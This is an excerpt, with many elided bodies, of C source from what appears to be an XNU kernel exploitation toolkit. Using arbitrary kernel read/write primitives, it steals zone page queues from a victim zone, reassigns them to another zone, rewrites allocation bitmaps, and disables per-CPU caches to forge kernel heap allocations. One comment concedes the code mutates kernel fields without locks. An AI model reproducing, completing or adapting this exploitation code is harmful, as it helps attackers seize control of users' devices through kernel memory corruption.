...
static dispatch_once_t xpl_util_zalloc_z_pcpu_cache_init_once;
static uintptr_t xpl_util_zalloc_z_pcpu_cache;


uintptr_t xpl_util_zalloc_pva_to_addr(uint32_t pva) {
...
uint xpl_util_zalloc_zone_to_index(uintptr_t zone) {
    return (uint)((zone - xpl_slider_kernel_slide(VAR_ZONE_ARRAY_ADDR)) / TYPE_ZONE_SIZE);
}

void xpl_util_zalloc_enable_zone_rsv(uintptr_t zone) {
...
uintptr_t xpl_util_zalloc_pageq_to_meta(uint32_t pageq) {
...
uintptr_t xpl_util_zalloc_bitmap_offset_to_ref(uint32_t offset) {
...
uint32_t xpl_util_zalloc_find_primary_pageq(uint32_t pageq_start, uint max_depth, uint* found_depth) {
    uint32_t cursor = pageq_start;
    uint depth = 0;
    while (depth < max_depth) {
        uintptr_t meta = xpl_util_zalloc_pageq_to_meta(cursor);
...
uintptr_t xpl_util_zalloc_find_victim_zone(int required_chunk_pages, int required_bitmap_capacity, int required_depth) {
    for (int i=0; i<VAR_ZONE_ARRAY_LEN; i++) {
        uintptr_t zone = xpl_util_zalloc_find_zone_at_index(i);
        ...
        uint found_depth;
        xpl_util_zalloc_find_primary_pageq(pageq_empty, required_depth, &found_depth);
...
uint32_t xpl_util_zalloc_steal_pageq(int required_chunk_pages, int required_bitmap_capacity, uintptr_t* victim_zone_out) {
    uintptr_t victim_zone = xpl_util_zalloc_find_victim_zone(required_chunk_pages, required_bitmap_capacity, 3);
    ...
    uint32_t pageq = xpl_util_zalloc_find_primary_pageq(pageq_empty, 10, NULL);
    uintptr_t meta = xpl_util_zalloc_pageq_to_meta(pageq);
    ...
    uintptr_t prev_meta = prev_pageq ? xpl_util_zalloc_pageq_to_meta(prev_pageq) : 0;
    uintptr_t next_meta = next_pageq ? xpl_util_zalloc_pageq_to_meta(next_pageq) : 0;
    ...
    xpl_util_zalloc_enable_zone_rsv(victim_zone);
...
void xpl_util_zalloc_change_pageq_owner(uintptr_t meta_head, uintptr_t zone) {
    int zone_index = xpl_util_zalloc_zone_to_index(zone);
    ...
    while (cursor) {
        ...
        cursor = next_pageq ? xpl_util_zalloc_pageq_to_meta(next_pageq) : 0;
    }
}


void xpl_util_zalloc_init_bitmap_inline(uintptr_t meta_base, uint16_t chunk_len, int num_allocs) {
...
void xpl_util_zalloc_init_bitmap_ref(uintptr_t meta_base, uint16_t chunk_len, int num_allocs) {
    uint32_t zm_bitmap = xpl_kmem_read_uint32(meta_base, TYPE_ZONE_PAGE_METADATA_MEM_ZM_BITMAP_OFFSET);
    
    uintptr_t bitmap_base = xpl_util_zalloc_bitmap_offset_to_ref(zm_bitmap);
...
void xpl_util_zalloc_init_bitmap(uintptr_t meta, uint16_t chunk_len, int num_allocs) {
    ...
    if (zm_inline) {
        xpl_util_zalloc_init_bitmap_inline(meta, chunk_len, num_allocs);
    } else {
        xpl_util_zalloc_init_bitmap_ref(meta, chunk_len, num_allocs);
    }
}


void xpl_util_zalloc_intialize_stolen_pageq(xpl_util_zalloc_t util) {
    xpl_assert(util->stolen_pageq != 0);
    uintptr_t meta = xpl_util_zalloc_pageq_to_meta(util->stolen_pageq);
    xpl_util_zalloc_change_pageq_owner(meta, util->recipient_zone);
    ...
    xpl_util_zalloc_init_bitmap(meta, chunk_len, util->num_allocs);
...
void xpl_util_zalloc_disable_pcpu_cache(uintptr_t zone) {
    ...
    if (z_recirc_cur) {
        dispatch_once(&xpl_util_zalloc_z_pcpu_cache_init_once, ^() {
            xpl_log_debug("intializing xpl_util_zalloc_z_pcpu_cache");
            ...
            xpl_util_zalloc_z_pcpu_cache = xpl_allocator_large_mem_allocate_disowned(alloc_size);
            char* temp = malloc(alloc_size);
            bzero(temp, alloc_size);
            xpl_kmem_write(xpl_util_zalloc_z_pcpu_cache, 0, temp, alloc_size);
            free(temp);
        });
        ...
        xpl_kmem_write_uint64(zone, TYPE_ZONE_MEM_Z_PCPU_CACHE_OFFSET, xpl_util_zalloc_z_pcpu_cache);
    } else {
...
xpl_util_zalloc_t xpl_util_zalloc_create(uintptr_t zone, int num_allocs) {
    ...
    if (z_pcpu_cache) {
        ...
        xpl_util_zalloc_disable_pcpu_cache(zone);
    }
    
    int required_chunk_pages = (z_elem_size * num_allocs + xpl_PAGE_SIZE - 1) / xpl_PAGE_SIZE;
    int required_bitmap_capacity = num_allocs;
    uintptr_t victim_zone;
    uint32_t pageq = xpl_util_zalloc_steal_pageq(required_chunk_pages, required_bitmap_capacity, &victim_zone);
    
    xpl_util_zalloc_t util = malloc(sizeof(struct xpl_util_zalloc));
    util->stolen_pageq = pageq;
    util->recipient_zone = zone;
    util->victim_zone = victim_zone;
    util->num_allocs = num_allocs;
    xpl_util_zalloc_intialize_stolen_pageq(util);
    
    // May help avoid zone z_elems_free accounting panic in case we corrupted
    // the field while mutating without lock
    xpl_util_zalloc_enable_zone_rsv(zone);
    return util;
}


int xpl_util_zalloc_meta_clear_bitmap_inline(uintptr_t meta_base, int eidx) {
...
int xpl_util_zalloc_meta_clear_bitmap_ref(uintptr_t meta_base, int eidx) {
    uint32_t bitmap_offset = xpl_kmem_read_uint32(meta_base, TYPE_ZONE_PAGE_METADATA_MEM_ZM_BITMAP_OFFSET);
    uintptr_t bitmap_base = xpl_util_zalloc_bitmap_offset_to_ref(bitmap_offset);
...
int xpl_util_zalloc_meta_clear_bit(uintptr_t meta, int eidx) {
    ...
    if (zm_inline_bitmap) {
        return xpl_util_zalloc_meta_clear_bitmap_inline(meta, eidx);
    } else {
        return xpl_util_zalloc_meta_clear_bitmap_ref(meta, eidx);
    }
}


void xpl_util_zalloc_dec_z_elem_free(xpl_util_zalloc_t util) {
...
uintptr_t xpl_util_zalloc_alloc(xpl_util_zalloc_t util, int element_idx) {
    uintptr_t meta = xpl_util_zalloc_pageq_to_meta(util->stolen_pageq);
    int error = xpl_util_zalloc_meta_clear_bit(meta, element_idx);
    ...
    xpl_util_zalloc_dec_z_elem_free(util);
    
    uintptr_t page = xpl_util_zalloc_pva_to_addr(util->stolen_pageq);
    return page + element_idx * z_elem_size;
}


void xpl_util_zalloc_destroy(xpl_util_zalloc_t* util_p) {
    xpl_util_zalloc_t util = *util_p;
